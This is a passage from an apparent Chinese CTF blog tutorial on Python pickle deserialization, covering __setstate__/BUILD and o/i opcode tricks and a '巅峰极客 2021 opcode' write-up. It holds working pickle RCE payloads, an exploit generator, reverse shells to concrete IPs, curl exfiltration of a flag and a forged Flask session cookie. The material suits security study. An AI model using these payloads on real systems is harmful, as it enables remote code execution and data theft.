&lt;/code>&lt;/pre>&lt;/div>&lt;p>————所以在不允许&lt;code>b'R'&lt;/code>的情况下，思路则是篡改secret中的name和categoriy，单纯的用&lt;code>b'c'&lt;/code>引入模块对Animal进行实例化，这一过程也相当于是执行了函数&lt;/p>
&lt;/details>
&lt;p>一种解决办法就是这个栗子中的，干脆就不rce，而是用&lt;code>b'c'&lt;/code>变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。&lt;/p>
&lt;h3 id="--使用__setstate__bb实现rce">&amp;ndash;&amp;raquo;使用&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>实现rce&lt;/h3>
&lt;p>另一种方式是用BUILD指令&lt;code>b'b'&lt;/code>及进行rce。&lt;/p>
&lt;p>在pickle源码中BUILD指令是这样的&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>如果一个实例inst拥有&lt;code>__setstate__&lt;/code>方法，则把&lt;code>state&lt;/code>交给&lt;code>__setstate__&lt;/code>方法来处理；否则直接把&lt;code>state&lt;/code>这个&lt;code>dist&lt;/code>的内容合并到&lt;code>inst.__dict__ &lt;/code>内。&lt;/p>
&lt;p>如果一个类原本没有&lt;code>__setstate__&lt;/code>这个方法，当我们用&lt;code>{'__setstate__': os.system}&lt;/code>来BUILD这个对象，那么现在对象的&lt;code>__setstate__&lt;/code>就变成了&lt;code>os.system&lt;/code>；接下来利用&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>来再次BUILD这个对象，则会执行&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ，而此时&lt;code>__setstate__&lt;/code>已经被我们设置为&lt;code>os.system&lt;/code>，因此实现了rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>可以看到成功做到了rce~~反弹shell当然也可以&lt;/p>
&lt;h3 id="--使用_instantiateload_objload_instbobi实现rce">&amp;ndash;&amp;raquo;使用&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>实现rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 反弹shell当然也可 都说了是rce了&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子8 - [巅峰极客 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的&lt;code>session['data']&lt;/code>处&lt;/p>
&lt;p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法&lt;u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写&lt;code>pickle.loads&lt;/code>方法，只是个摆设&lt;/u>，相当于仅对R操作码进行了限制，笑嘻了&lt;/p>
&lt;p>直接上&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>来弹shell了，不多bb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">eval&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是用&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>外带flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后生成b64的内容（用&lt;code>'''&lt;/code>的好处是不用考虑太多引号转义的问题&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie的生成就是flask_session_cookie_manager一把梭了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>————如果按照题目原有的意思，限制&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>操作码也是很好做出来的&lt;/p>
&lt;p>先用pker生成带R的opcode&lt;/p>
